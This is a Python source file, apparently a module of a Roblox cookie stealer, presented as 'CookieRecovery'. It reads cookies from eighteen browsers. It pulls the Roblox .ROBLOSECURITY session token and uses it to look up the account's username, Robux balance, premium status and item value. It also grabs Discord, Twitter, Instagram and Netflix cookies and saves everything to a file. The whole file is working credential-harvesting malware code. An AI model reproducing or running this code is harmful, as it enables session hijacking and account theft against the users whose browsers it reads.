import requests
import browser_cookie3
import robloxpy
import logging
import json

from Utilities.DataSaver import DataSaverUtility

logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

class CookieRecovery:

    DOMAINS = ["discord.com", "twitter.com", "instagram.com", "netflix.com"]

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Roblox/WinInet',
            'Referer': 'https://www.roblox.com/'
        })

    def _get_cookie(self, domain_name='roblox.com'):
        """Retrieve the cookie from supported browsers for a given domain."""
        browsers = ['firefox', 'chrome', 'chromium', 'edge', 'opera', 'vivaldi', 'brave', 'yandex', 'jbrowser', 'palemoon', 'waterfox', 'avast', 'slimjet', 'maxthon', 'comodo_dragon', 'comodo_icedragon', '360se', 'falkon']
        for browser in browsers:
            try:
                cookies = getattr(browser_cookie3, browser)(domain_name=domain_name)
                for cookie in cookies:
                    if domain_name == 'roblox.com' and cookie.name == '.ROBLOSECURITY':
                        return cookie.value
                    elif domain_name != 'roblox.com':
                        return {'name': cookie.name, 'value': cookie.value}
            except Exception:
                pass
        return None

    def _fetch_user_info(self, roblox_cookie):
        """Fetch user info from Roblox based on the cookie."""
        self.session.headers.update({'Cookie': f'.ROBLOSECURITY={roblox_cookie}'})
        try:
            response = self.session.get('https://www.roblox.com/mobileapi/userinfo')
            return response.json()
        except Exception as e:
            logging.error(f"Error retrieving user info: {e}")
            return None

    def _get_rap(self, user_id):
        """Retrieve the RAP value for the user."""
        try:
            return robloxpy.User.External.GetRAP(user_id)
        except Exception as e:
            logging.error(f"Error fetching RAP for user ID {user_id}: {e}")
            return 'Not available'

    def _format_data(self, roblox_data, other_cookies):
        """Format the recovered data for saving."""
        formatted_data = []

        # Format Roblox data
        roblox_info = {
            "Type": "Roblox Account Details",
            "Roblox Cookie": roblox_data.get("cookie", "Not available"),
            "Username": roblox_data.get("username", "Not available"),
            "Premium": roblox_data.get("premium", "Not available"),
            "ID": roblox_data.get("id", "Not available"),
            "Robux Balance": roblox_data.get("robux", "Not available"),
            "RAP": roblox_data.get("rap", "Not available")
        }
        formatted_data.append(roblox_info)

        # Format other domain cookies
        for domain, cookie in other_cookies.items():
            domain_info = {
                "Type": f"Cookies for {domain}",
                "Name": cookie['name'],
                "Value": cookie['value']
            }
            formatted_data.append(domain_info)

        return json.dumps(formatted_data, indent=4)

    def recover_data(self):
        roblox_data = {}
        other_cookies = {}

        roblox_cookie = self._get_cookie()
        if not roblox_cookie:
            logging.error("Roblox cookie retrieval failed.")
            return

        user_info = self._fetch_user_info(roblox_cookie)
        if not user_info:
            logging.error("Error retrieving Roblox user data.")
            return

        user_id = user_info.get("UserID")
        rap = self._get_rap(user_id) if user_id else 'Not available'

        roblox_data = {
            "cookie": roblox_cookie,
            "username": user_info.get('UserName', 'Not available'),
            "premium": user_info.get('IsPremium', 'Not available'),
            "id": user_id,
            "robux": user_info.get('RobuxBalance', 'Not available'),
            "rap": rap
        }

        # Recovering data from other domains
        for domain in self.DOMAINS:
            if domain != 'roblox.com':
                cookies = self._get_cookie(domain_name=domain)
                if cookies:
                    other_cookies[domain] = {
                        "name": cookies['name'],
                        "value": cookies['value']
                    }

        # Format and save the data
        formatted_data = self._format_data(roblox_data, other_cookies)
        DataSaverUtility.save_to_file(formatted_data)